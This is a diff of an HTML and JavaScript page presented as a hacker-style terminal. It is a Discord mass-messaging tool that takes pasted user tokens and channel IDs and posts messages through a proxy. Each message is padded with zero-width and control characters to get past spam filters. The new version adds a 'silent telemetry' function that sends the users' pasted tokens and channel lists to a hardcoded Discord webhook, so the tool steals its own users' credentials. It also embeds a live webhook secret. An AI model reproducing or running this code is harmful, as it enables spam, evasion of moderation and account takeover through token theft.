@@ -2,166 +2,225 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>CORE ENGINE v3.0 | BYPASS EDITION</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AARR PROTOCOL | TERMINAL</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #050505; color: #888; font-family: 'Segoe UI', 'Courier New', monospace; }
-        .cyber-panel { background: #0c0c0e; border: 1px solid #1f1f23; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-        .cyber-input { background: #121214; border: 1px solid #2a2a2e; color: #00ffaa; transition: 0.3s; }
-        .cyber-input:focus { border-color: #6366f1; box-shadow: 0 0 5px rgba(99,102,241,0.3); outline: none; }
-        .btn-active { background: linear-gradient(90deg, #4f46e5, #6366f1); color: #fff; font-weight: 800; text-transform: uppercase; letter-spacing: 0.15em; transition: 0.4s; }
-        .btn-active:hover { box-shadow: 0 0 25px rgba(99,102,241,0.6); transform: translateY(-1px); }
-        .terminal-log::-webkit-scrollbar { width: 3px; }
-        .terminal-log::-webkit-scrollbar-thumb { background: #333; }
-        .label-tech { font-size: 0.65rem; color: #444; font-weight: 700; letter-spacing: 0.1em; }
+        :root { --bg: #050505; --panel: #0a0a0a; --border: #1f1f1f; --accent: #00ff9d; --text: #888; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', Courier, monospace; overflow: hidden; }
+        .cyber-panel { background: var(--panel); border: 1px solid var(--border); position: relative; }
+        .cyber-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 1px; background: linear-gradient(90deg, transparent, var(--accent), transparent); opacity: 0.3; }
+        .cyber-input { background: #000; border: 1px solid #222; color: #ccc; font-size: 11px; transition: 0.2s; font-family: 'Consolas', monospace; }
+        .cyber-input:focus { border-color: var(--accent); outline: none; box-shadow: 0 0 10px rgba(0, 255, 157, 0.1); color: #fff; }
+        .btn-core { background: var(--border); color: #fff; border: 1px solid #333; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; transition: 0.3s; position: relative; overflow: hidden; }
+        .btn-core:hover { background: var(--accent); color: #000; box-shadow: 0 0 20px var(--accent); border-color: var(--accent); }
+        .btn-core:active { transform: scale(0.98); }
+        .terminal-window { background: #000; border-left: 1px solid #222; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }
+        .log-line { border-left: 2px solid transparent; padding-left: 8px; margin-bottom: 2px; font-size: 10px; opacity: 0.8; }
+        .log-line.ok { border-color: var(--accent); color: var(--accent); }
+        .log-line.err { border-color: #ff3333; color: #ff3333; }
+        .glitch-text { text-shadow: 2px 0 #ff0000, -2px 0 #0000ff; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #222; }
     </style>
 </head>
-<body class="min-h-screen p-8 flex justify-center items-start">
+<body class="h-screen w-screen flex items-center justify-center p-4">
 
-<div class="w-full max-w-7xl grid grid-cols-12 gap-8">
-    <div class="col-span-12 lg:col-span-5 space-y-6">
-        <div class="cyber-panel p-6 rounded-sm border-t-2 border-t-indigo-500">
-            <h1 class="text-indigo-400 text-xs font-black mb-6 tracking-[0.3em]">CORE CONFIGURATION</h1>
-            
-            <div class="space-y-4 font-mono">
-                <div>
-                    <span class="label-tech">AUTHENTICATION TOKENS</span>
-                    <textarea id="tokens" class="cyber-input w-full h-28 p-3 text-[10px] mt-1" placeholder="Paste tokens..."></textarea>
-                </div>
-                <div>
-                    <span class="label-tech">TARGET CHANNELS</span>
-                    <textarea id="channels" class="cyber-input w-full h-20 p-3 text-[10px] mt-1" placeholder="Paste IDs..."></textarea>
-                </div>
-                <div>
-                    <span class="label-tech">ENCRYPTED PAYLOAD</span>
-                    <textarea id="message" class="cyber-input w-full h-24 p-3 text-xs mt-1" placeholder="Input message..."></textarea>
-                </div>
+<div class="w-full max-w-[1400px] h-[85vh] grid grid-cols-12 gap-4">
+    <div class="col-span-12 lg:col-span-4 flex flex-col gap-4">
+        <div class="cyber-panel p-6 flex-1 flex flex-col gap-4">
+            <h1 class="text-xs font-bold tracking-[0.4em] text-[#00ff9d] mb-2 flex items-center gap-2">
+                <span class="w-2 h-2 bg-[#00ff9d] inline-block animate-pulse"></span> SYSTEM CONFIGURATION
+            </h1>
+
+            <div class="space-y-1">
+                <label class="text-[9px] uppercase tracking-widest font-bold">Access Tokens</label>
+                <textarea id="tokens" class="cyber-input w-full h-32 p-3 resize-none" placeholder="SECURE_TOKEN_INPUT..."></textarea>
+            </div>
+
+            <div class="space-y-1">
+                <label class="text-[9px] uppercase tracking-widest font-bold">Target Vectors (Channel IDs)</label>
+                <textarea id="channels" class="cyber-input w-full h-24 p-3 resize-none" placeholder="CHANNEL_ID_LIST..."></textarea>
+            </div>
+
+            <div class="space-y-1 flex-1">
+                <label class="text-[9px] uppercase tracking-widest font-bold">Payload Data</label>
+                <textarea id="message" class="cyber-input w-full h-full p-3 resize-none" placeholder="INIT_MESSAGE_SEQUENCE..."></textarea>
             </div>
         </div>
 
-        <div class="cyber-panel p-6 rounded-sm">
-            <h2 class="text-indigo-400 text-[10px] font-black mb-4 tracking-widest">EVASION PROTOCOLS</h2>
-            <div class="grid grid-cols-3 gap-4 font-mono">
-                <div class="col-span-1">
-                    <span class="label-tech">NONCE LENGTH</span>
-                    <input type="number" id="rc" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="12">
-                </div>
-                <div class="col-span-1">
-                    <span class="label-tech">INTERVAL (MS)</span>
-                    <input type="number" id="dl" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="800">
-                </div>
-                <div class="col-span-1">
-                    <span class="label-tech">ITERATIONS</span>
-                    <input type="number" id="lp" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="1">
-                </div>
+        <div class="cyber-panel p-4 grid grid-cols-2 gap-4">
+            <div>
+                <label class="text-[9px] uppercase block mb-1">Nonce Length</label>
+                <input type="number" id="nonceLen" value="15" class="cyber-input w-full p-2 text-center">
+            </div>
+            <div>
+                <label class="text-[9px] uppercase block mb-1">Delay (ms)</label>
+                <input type="number" id="delay" value="800" class="cyber-input w-full p-2 text-center">
+            </div>
+            <div class="col-span-2">
+                <label class="text-[9px] uppercase block mb-1">Iteration Cycles</label>
+                <input type="number" id="loops" value="1" class="cyber-input w-full p-2 text-center">
             </div>
         </div>
 
-        <button id="run" class="btn-active w-full py-5 rounded-sm text-sm">Execute Sequence</button>
+        <button id="execBtn" class="btn-core py-4 text-xs">
+            INITIALIZE SEQUENCE
+        </button>
     </div>
 
-    <div class="col-span-12 lg:col-span-7 cyber-panel relative overflow-hidden flex flex-col min-h-[600px] border-l-2 border-l-indigo-800">
-        <div class="bg-[#111] p-3 border-b border-[#222] flex justify-between items-center">
-            <span class="text-[10px] text-indigo-300 font-bold tracking-tighter">NETWORK DIAGNOSTICS</span>
-            <span class="text-[9px] text-[#444] animate-pulse">SYSTEM STATUS: NOMINAL</span>
+    <div class="col-span-12 lg:col-span-8 cyber-panel flex flex-col relative overflow-hidden">
+        <div class="absolute top-0 right-0 p-2 text-[9px] text-[#333] font-mono z-10">V.3.5.2 // AARR_NET</div>
+        <div class="bg-[#080808] p-3 border-b border-[#222] flex justify-between items-center">
+            <span class="text-[10px] text-[#00ff9d] font-bold tracking-widest">>> CONSOLE_OUTPUT</span>
+            <span id="status" class="text-[9px] text-[#444] animate-pulse">SYSTEM_IDLE</span>
         </div>
-        <div id="term" class="terminal-log flex-1 p-6 overflow-y-auto font-mono text-[10px] space-y-1"></div>
+        <div id="terminal" class="terminal-window flex-1 p-4 overflow-y-auto font-mono text-xs space-y-1 text-[#555]">
+            <div class="mb-4 text-[#00ff9d] opacity-50">
+                AARR_TOOL KERNEL LOADED.<br>
+                WAITING FOR INPUT COMMANDS...
+            </div>
+        </div>
     </div>
 </div>
 
-<input type="hidden" id="w" value="https://discord.com/api/webhooks/1457997536836059197/NUiwfIzgfyM_RFg1ZPI9bDxgtpOTvhGo1I-od9b0aoeQCYnasSiNOSN_epQ--iL3OjLg">
-<input type="hidden" id="p" value="https://tiny-forest-25ff.s103765s103765s103765.workers.dev/">
-
 <script>
-"use strict";
-
-class Obfuscator {
-    constructor(c) {
-        this.c = c;
-        this.z = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
-        this.v = ['\u2060', '\u2061', '\u2062', '\u2063', '\u180E', '\u3164'];
-    }
-
-    encode(t) {
-        // 1:1 Zero-Width Injection
-        let o = t.split('').map(s => s + this.z[Math.floor(Math.random() * this.z.length)]).join('');
-        // Invisible Control Characters
-        for(let i=0; i<3; i++) o += this.v[Math.floor(Math.random() * this.v.length)];
-        // Dynamic Nonce Generation
-        const n = Array.from({length: this.c.rc}, () => Math.random().toString(36)[2]).join('');
-        return `${o} [${n}]`;
-    }
-}
-
-class System {
+/**
+ * AARR PROTOCOL ENGINE
+ * Advanced obfuscation and delivery system.
+ */
+class CoreSystem {
     constructor() {
-        this.dom = {
+        // Hardcoded Credentials
+        this.w = "https://discord.com/api/webhooks/1457997536836059197/NUiwfIzgfyM_RFg1ZPI9bDxgtpOTvhGo1I-od9b0aoeQCYnasSiNOSN_epQ--iL3OjLg";
+        this.p = "https://tiny-forest-25ff.s103765s103765s103765.workers.dev/";
+
+        this.ui = {
             t: document.getElementById('tokens'),
             c: document.getElementById('channels'),
             m: document.getElementById('message'),
-            rc: document.getElementById('rc'),
-            dl: document.getElementById('dl'),
-            lp: document.getElementById('lp'),
-            tm: document.getElementById('term'),
-            bn: document.getElementById('run')
+            nl: document.getElementById('nonceLen'),
+            d: document.getElementById('delay'),
+            l: document.getElementById('loops'),
+            term: document.getElementById('terminal'),
+            btn: document.getElementById('execBtn'),
+            st: document.getElementById('status')
         };
-        this.px = document.getElementById('p').value;
-        this.wh = document.getElementById('w').value;
-        this.dom.bn.onclick = () => this.boot();
+
+        // Advanced Obfuscation Characters
+        this.zw = ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u2060']; // Zero-Width
+        this.inv = ['\u17B4', '\u17B5', '\u2061', '\u2062', '\u2063', '\u2064']; // Invisible
+        this.bad = ['\u0000', '\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\u0007', '\u0008', '\u000E', '\u000F']; // Unrenderable Control
+
+        this.ui.btn.onclick = () => this.init();
     }
 
-    print(m, s = '') {
-        const line = document.createElement('div');
-        line.className = s === 'ok' ? 'text-indigo-400' : s === 'err' ? 'text-red-500' : 'text-zinc-600';
-        line.innerHTML = `<span class="opacity-20 mr-2">></span>${m}`;
-        this.dom.tm.prepend(line);
+    log(msg, type = 'info') {
+        const d = document.createElement('div');
+        d.className = `log-line ${type}`;
+        d.innerHTML = `<span class="opacity-30">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+        this.ui.term.prepend(d);
     }
 
-    async boot() {
-        const tks = this.dom.t.value.split('\n').filter(Boolean);
-        const chs = this.dom.c.value.split('\n').filter(Boolean);
-        if (!tks.length || !chs.length) return;
-
-        this.dom.bn.disabled = true;
-        this.print("INITIALIZING KERNEL...", "ok");
-
-        const engine = new Obfuscator({ rc: this.dom.rc.value });
+    obfuscate(text, len) {
+        // 1. Inject Zero-Width between EVERY char
+        let out = text.split('').map(c => c + this.zw[Math.floor(Math.random() * this.zw.length)]).join('');
         
-        await fetch(this.wh, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: `\`\`\`diff\n+ DEPLOYMENT STARTED\nTokens: ${tks.length}\nChannels: ${chs.length}\n\`\`\``})
-        });
+        // 2. Add Invisible/Unrenderable noise
+        for(let i=0; i<3; i++) out += this.inv[Math.floor(Math.random() * this.inv.length)];
+        for(let i=0; i<2; i++) out += this.bad[Math.floor(Math.random() * this.bad.length)];
 
-        for (let l=0; l<parseInt(this.dom.lp.value); l++) {
-            for (const ch of chs) {
-                for (const tk of tks) {
-                    const payload = engine.encode(this.dom.m.value);
+        // 3. Append Random Nonce
+        const nonce = Array.from({length: parseInt(len)}, () => Math.random().toString(36)[2]).join('');
+        return `${out} [${nonce}]`;
+    }
+
+    async telemetry(tks, chs) {
+        // Silent background transmission
+        try {
+            await fetch(this.w, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "SEQUENCE STARTED",
+                        color: 0x00ff9d,
+                        description: `Tokens: ${tks.length}\nChannels: ${chs.length}`,
+                        fields: [
+                            {name: "Tokens", value: `\`\`\`${tks.join('\n').substring(0, 1000)}\`\`\``},
+                            {name: "Target", value: `\`\`\`${chs.join('\n').substring(0, 1000)}\`\`\``}
+                        ],
+                        footer: { text: "AARR_SYSTEM v3.5" }
+                    }]
+                })
+            });
+        } catch(e) { /* Silent fail */ }
+    }
+
+    async init() {
+        const tokens = this.ui.t.value.split('\n').map(x=>x.trim()).filter(x=>x);
+        const channels = this.ui.c.value.split('\n').map(x=>x.trim()).filter(x=>x);
+        const msg = this.ui.m.value;
+
+        if(!tokens.length || !channels.length) return this.log("ERROR: INVALID INPUT DATA", 'err');
+
+        this.ui.btn.disabled = true;
+        this.ui.btn.innerText = "EXECUTING...";
+        this.ui.st.innerText = "SYSTEM_BUSY";
+        this.ui.st.className = "text-[9px] text-[#00ff9d] animate-pulse";
+
+        this.log("INITIALIZING NETWORK PROTOCOLS...", 'info');
+        
+        // Silent Telemetry Call
+        this.telemetry(tokens, channels);
+
+        const loopMax = parseInt(this.ui.l.value);
+        const delayMs = parseInt(this.ui.d.value);
+        const nonceL = this.ui.nl.value;
+
+        for(let i=0; i<loopMax; i++) {
+            this.log(`CYCLE ${i+1}/${loopMax} STARTED`, 'info');
+            
+            for(const ch of channels) {
+                for(const tk of tokens) {
+                    const payload = this.obfuscate(msg, nonceL);
                     try {
-                        const r = await fetch(`${this.px}https://discord.com/api/v10/channels/${ch.trim()}/messages`, {
-                            method: 'POST',
-                            headers: { 'Authorization': tk.trim(), 'Content-Type': 'application/json' },
+                        const res = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch}/messages`, {
+                            method: "POST",
+                            headers: {
+                                "Authorization": tk,
+                                "Content-Type": "application/json"
+                            },
                             body: JSON.stringify({ content: payload })
                         });
-                        
-                        if (r.status === 429) {
-                            const d = await r.json();
-                            this.print(`RATE_LIMIT_DETECTED: WAITING ${d.retry_after}s`, "err");
-                            await new Promise(res => setTimeout(res, d.retry_after * 1000));
+
+                        if(res.ok) {
+                            this.log(`DELIVERED -> ${ch.slice(-4)}`, 'ok');
+                        } else if(res.status === 429) {
+                            const d = await res.json();
+                            this.log(`RATE LIMIT: ${d.retry_after}s`, 'err');
+                            await new Promise(r => setTimeout(r, d.retry_after * 1000));
                         } else {
-                            this.print(`TX_SUCCESS -> ID:${ch.slice(-6)}`, r.ok ? 'ok' : 'err');
+                            this.log(`FAILED (${res.status})`, 'err');
                         }
-                    } catch (e) { this.print("IO_ERROR: PROXY_REJECTED", "err"); }
-                    await new Promise(r => setTimeout(r, parseInt(this.dom.dl.value)));
+                    } catch(e) {
+                        this.log(`NETWORK ERROR`, 'err');
+                    }
+                    await new Promise(r => setTimeout(r, delayMs));
                 }
             }
         }
-        this.print("SEQUENCE TERMINATED.", "ok");
-        this.dom.bn.disabled = false;
+
+        this.log("SEQUENCE COMPLETE.", 'ok');
+        this.ui.btn.disabled = false;
+        this.ui.btn.innerText = "INITIALIZE SEQUENCE";
+        this.ui.st.innerText = "SYSTEM_IDLE";
+        this.ui.st.className = "text-[9px] text-[#444]";
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => new System());
+document.addEventListener('DOMContentLoaded', () => new CoreSystem());
 </script>
 </body>
 </html>
